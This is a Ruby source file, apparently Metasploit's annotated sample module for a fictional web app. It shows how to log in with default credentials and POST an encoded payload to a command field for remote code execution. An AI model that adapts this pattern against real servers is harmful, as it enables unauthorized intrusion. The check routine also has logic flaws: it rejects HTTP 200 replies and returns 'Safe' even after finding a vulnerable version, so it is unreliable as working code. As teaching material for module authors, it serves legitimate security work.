##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary web server
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  #
  # This exploit affects a webapp, so we need to import HTTP Client
  # to easily interact with it.
  #
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        'Name'           => 'Sample Webapp Exploit',
        'Description'    => %q(
            This exploit module illustrates how a vulnerability could be exploited
          in a webapp.
        ),
        'License'        => MSF_LICENSE,
        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.
        # Add reference to additional authors, like those creating original proof of concepts or
        # reference materials.
        # It is also common to comment in who did what (PoC vs metasploit module, etc)
        'Author'         =>
          [
            'h00die <mike@stcyrsecurity.com>', # msf module
            'researcher' # original PoC, analysis
          ],
        'References'     =>
          [
            [ 'OSVDB', '12345' ],
            [ 'EDB', '12345' ],
            [ 'URL', 'http://www.example.com'],
            [ 'CVE', '1978-1234']
          ],
        # platform refers to the type of platform.  For webapps, this is typically the language of the webapp.
        # js, php, python, nodejs are common, this will effect what payloads can be matched for the exploit.
        # A full list is available in lib/msf/core/payload/uuid.rb
        'Platform'       => ['python'],
        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
        'Privileged'     => false,
        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but for webapps typically
        # this is the application language. ARCH_PYTHON, ARCH_PHP, ARCH_JAVA are some examples
        # A full list is available in lib/msf/core/payload/uuid.rb
        'Arch'           => ARCH_PYTHON,
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DisclosureDate' => '2013-04-01',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget'  => 0
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '123456']),
        OptString.new('TARGETURI', [ true, 'The URI of the Example Application', '/example/'])
      ], self.class
    )
  end

  #
  # The sample exploit checks the index page to verify the version number is exploitable
  # we use a regex for the version number
  #
  def check
    # we want to handle cases where the port/target isn't open/listening gracefully
    begin
      # only catch the response if we're going to use it, in this case we do for the version
      # detection.
      res = send_request_cgi(
        'uri'       => normalize_uri(target_uri.path, 'index.php'),
        'method'    => 'GET'
      )
      # gracefully handle if res comes back as nil, since we're not guaranteed a response
      # also handle if we get an unexpected HTTP response code
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code == 200

      # here we're looking through html for the version string, similar to:
      # Version 1.2
      /Version: (?<version>[\d]{1,2}\.[\d]{1,2})<\/td>/ =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('1.3')
        vprint_good("Version Detected: #{version}")
        Exploit::CheckCode::Appears
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe
  end

  #
  # The exploit method attempts a login, then attempts to throw a command execution
  # at a web page through a POST variable
  #
  def exploit
    begin
      # attempt a login. In this case we show basic auth, and a POST to a fake username/password
      # simply to show how both are done
      vprint_status('Attempting login')
      # since we will check res to see if auth was a success, make sure to capture the return
      res = send_request_cgi(
        'uri'           => '/login.html',
        'method'        => 'POST',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'vars_post'     => {
          'username' => datastore['USERNAME'],
          'password' => datastore['PASSWORD']
        }
      )

      # a valid login will give us a 301 redirect to /home.html so check that.
      # ALWAYS assume res could be nil and check it first!!!!!
      if res && res.code != 301
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})")
      end

      # grab our valid cookie
      cookie = res.get_cookies
      # we don't care what the response is, so don't bother saving it from send_request_cgi
      vprint_status('Attempting exploit')
      send_request_cgi(
        'uri'       => normalize_uri(target_uri.path, 'command.html'),
        'method'    => 'POST',
        'cookie'    => cookie,
        'vars_post'  =>
        {
          'cmd_str' => payload.encoded
        }
      )

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end

  end
end
